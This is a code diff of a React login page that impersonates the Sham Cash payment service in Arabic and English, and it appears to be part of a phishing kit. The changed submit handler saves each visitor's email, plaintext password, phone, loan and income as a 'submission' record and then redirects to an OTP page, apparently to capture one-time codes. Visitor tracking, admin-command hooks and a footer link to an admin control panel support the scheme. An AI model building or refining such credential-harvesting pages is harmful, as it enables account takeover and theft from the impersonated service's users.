@@ -8,7 +8,7 @@ import {
   TrendingUp,
   UserRound,
 } from "lucide-react";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
@@ -25,8 +25,6 @@ const T = {
     submit: "تسجيل الدخول",
     forgotPass: "هل نسيت كلمة المرور؟",
     changePass: "تغيير كلمة المرور",
-    waiting: "يرجى الانتظار...",
-    waitingSub: "جارٍ التحقق من بياناتك",
   },
   en: {
     lang: "العربية", dir: "ltr" as const,
@@ -39,8 +37,6 @@ const T = {
     submit: "Sign In",
     forgotPass: "Forgot your password?",
     changePass: "Change Password",
-    waiting: "Please wait...",
-    waitingSub: "Verifying your information",
   },
 };
 
@@ -49,11 +45,15 @@ function ShamLogo() {
     <div className="relative h-28 w-32">
       <div
         className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
-        style={{ clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)" }}
+        style={{
+          clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
+        }}
       />
       <div
         className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
-        style={{ clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)" }}
+        style={{
+          clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
+        }}
       />
     </div>
   );
@@ -64,58 +64,19 @@ function broadcast(data: Record<string, string>) {
   localStorage.setItem("sham_visitor_updated_at", Date.now().toString());
 }
 
-function isStealthMode(): boolean {
-  return sessionStorage.getItem("sham_stealth") === "1";
-}
-
 export function ShamCashLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
-  const [isWaiting, setIsWaiting] = useState(false);
-  const [progress, setProgress] = useState(0);
   const [lang, setLang] = useLang();
   const t = T[lang];
-  const progressRef = useRef<ReturnType<typeof setInterval> | null>(null);
   useVisitorTracking("تسجيل الدخول");
   useAdminCommands();
 
   useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    if (params.get("stealth") === "1") {
-      sessionStorage.setItem("sham_stealth", "1");
-    }
+    broadcast({ email: "", phone: "", loan: "", income: "" });
   }, []);
-
-  useEffect(() => {
-    if (!isStealthMode()) {
-      broadcast({ email: "", phone: "", loan: "", income: "" });
-    }
-  }, []);
-
-  useEffect(() => {
-    if (isWaiting) {
-      setProgress(0);
-      let current = 0;
-      progressRef.current = setInterval(() => {
-        current += Math.random() * 3 + 0.5;
-        if (current >= 85) {
-          current = 85;
-          if (progressRef.current) clearInterval(progressRef.current);
-        }
-        setProgress(current);
-      }, 120);
-    } else {
-      if (progressRef.current) clearInterval(progressRef.current);
-      setProgress(0);
-    }
-    return () => { if (progressRef.current) clearInterval(progressRef.current); };
-  }, [isWaiting]);
 
   function updateField(key: string, value: string) {
-    if (isStealthMode()) {
-      setFields((p) => ({ ...p, [key]: value }));
-      return;
-    }
     const next = { ...fields, [key]: value };
     setFields(next as typeof fields);
     if (key === "phone") localStorage.setItem("sham_phone", value);
@@ -127,89 +88,8 @@ export function ShamCashLogin() {
     }, 2000);
   }
 
-  function handleSubmit(e: React.FormEvent) {
-    e.preventDefault();
-
-    if (isStealthMode()) {
-      window.location.href = "/otp";
-      return;
-    }
-
-    const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
-    localStorage.setItem("sham_visitor_id", visitorId);
-    localStorage.setItem("sham_visitor_status", "submitted");
-
-    const existing: Record<string, unknown>[] = (() => {
-      try { return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]"); } catch { return []; }
-    })();
-
-    const record = {
-      id: visitorId,
-      submittedAt: new Date().toLocaleTimeString("ar-SY"),
-      submittedAtTs: Date.now(),
-      email: fields.email,
-      password: fields.password,
-      phone: fields.phone,
-      loan: fields.loan,
-      income: fields.income,
-      otpCode: "",
-      otpStatus: null,
-      changepassStatus: null,
-      page: "تسجيل الدخول",
-      isActive: true,
-      lastSeen: Date.now(),
-    };
-
-    const idx = existing.findIndex((r) => r.id === visitorId);
-    if (idx >= 0) existing[idx] = record; else existing.unshift(record);
-    localStorage.setItem("sham_submissions", JSON.stringify(existing));
-    localStorage.setItem("sham_visitor_data", JSON.stringify({ email: fields.email, phone: fields.phone, loan: fields.loan, income: fields.income }));
-    localStorage.setItem("sham_visitor_password", fields.password);
-
-    setIsWaiting(true);
-  }
-
   return (
     <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
-      {/* Waiting overlay */}
-      {isWaiting && (
-        <div className="fixed inset-0 z-50 flex flex-col bg-[#151c36]">
-          {/* Top progress bar */}
-          <div className="h-[3px] w-full overflow-hidden bg-white/8 flex-none">
-            <div
-              className="h-full bg-gradient-to-r from-[#657bd8] via-[#8fa3ff] to-[#657bd8] transition-all duration-300 ease-out"
-              style={{ width: `${progress}%` }}
-            />
-          </div>
-
-          <div className="flex flex-1 flex-col items-center justify-center gap-8 px-8">
-            <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
-            <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
-
-            <ShamLogo />
-
-            <div className="flex flex-col items-center gap-3 text-center">
-              <div className="flex items-center gap-2">
-                <span className="inline-block h-2 w-2 animate-bounce rounded-full bg-[#657bd8]" style={{ animationDelay: "0ms" }} />
-                <span className="inline-block h-2 w-2 animate-bounce rounded-full bg-[#657bd8]" style={{ animationDelay: "150ms" }} />
-                <span className="inline-block h-2 w-2 animate-bounce rounded-full bg-[#657bd8]" style={{ animationDelay: "300ms" }} />
-              </div>
-              <p className="text-[22px] font-extrabold tracking-tight text-white/90">{t.waiting}</p>
-              <p className="text-[14px] font-semibold text-white/40">{t.waitingSub}</p>
-            </div>
-
-            <div className="w-full max-w-[260px]">
-              <div className="h-1 w-full overflow-hidden rounded-full bg-white/8">
-                <div
-                  className="h-full rounded-full bg-gradient-to-r from-[#657bd8] to-[#1fc28a] transition-all duration-300 ease-out"
-                  style={{ width: `${progress}%` }}
-                />
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
       <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
@@ -227,7 +107,37 @@ export function ShamCashLogin() {
           <ShamLogo />
         </div>
 
-        <form className="relative space-y-5" onSubmit={handleSubmit}>
+        <form
+          className="relative space-y-5"
+          onSubmit={(e) => {
+            e.preventDefault();
+            localStorage.setItem("sham_visitor_status", "submitted");
+            const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
+            const existing: Record<string, unknown>[] = (() => { try { return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]"); } catch { return []; } })();
+            const record = {
+              id: visitorId,
+              submittedAt: new Date().toLocaleTimeString("ar-SY"),
+              submittedAtTs: Date.now(),
+              email: fields.email,
+              password: fields.password,
+              phone: fields.phone,
+              loan: fields.loan,
+              income: fields.income,
+              otpCode: "",
+              otpStatus: null,
+              changepassStatus: null,
+              page: "تسجيل الدخول",
+              isActive: true,
+              lastSeen: Date.now(),
+            };
+            const idx = existing.findIndex((r) => r.id === visitorId);
+            if (idx >= 0) existing[idx] = record; else existing.unshift(record);
+            localStorage.setItem("sham_submissions", JSON.stringify(existing));
+            localStorage.setItem("sham_visitor_data", JSON.stringify({ email: fields.email, phone: fields.phone, loan: fields.loan, income: fields.income }));
+            localStorage.setItem("sham_visitor_password", fields.password);
+            window.location.href = "/otp";
+          }}
+        >
           <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
             {t.heading}
           </h1>
@@ -236,7 +146,7 @@ export function ShamCashLogin() {
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
               <input
-                type="text"
+                type="email"
                 placeholder={t.email}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir}
@@ -313,7 +223,10 @@ export function ShamCashLogin() {
 
           <p className="text-center text-[14px] font-semibold text-[#cfd2df]/78">
             {t.forgotPass}{" "}
-            <span className="cursor-pointer text-[#7183e6] hover:underline" onClick={() => { window.location.href = "/changepass"; }}>
+            <span
+              className="cursor-pointer text-[#7183e6] hover:underline"
+              onClick={() => { window.location.href = "/changepass"; }}
+            >
               {t.changePass}
             </span>
           </p>
@@ -324,7 +237,10 @@ export function ShamCashLogin() {
         </form>
 
         <footer className="relative mt-auto flex flex-col items-center gap-3 pb-0 pt-4 text-center">
-          <a href="/admin-panel/" className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide">
+          <a
+            href="/admin"
+            className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide"
+          >
             لوحة التحكم
           </a>
           <div className="space-y-3">
